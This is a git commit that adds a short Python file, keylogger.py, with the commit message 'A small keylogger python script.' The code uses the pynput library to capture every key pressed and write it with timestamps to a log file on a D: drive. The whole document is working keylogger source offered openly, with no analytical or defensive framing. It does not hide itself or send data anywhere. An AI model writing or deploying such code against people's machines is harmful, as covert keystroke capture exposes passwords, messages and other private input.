66eb385e1640f6ff8c198c1c2b0ead60632c7adc
Kanishk <kanishkverma2002@gmail.com>
2023-06-26 15:17:49 +0530

    A small keylogger python script.

---
+++ keylogger.py
@@ -0,0 +1,10 @@
+import pynput
+from pynput.keyboard import Key, Listener
+import logging 
+log_dir= r"D:\keylogger"
+logging.basicConfig(filename=(log_dir + r"/keylog.txt"), level=logging.DEBUG, format="%(asctime)s: %(message)s")
+def on_press(key):
+    logging.info(str(key))
+with Listener(on_press=on_press) as listener:
+    listener.join()
+
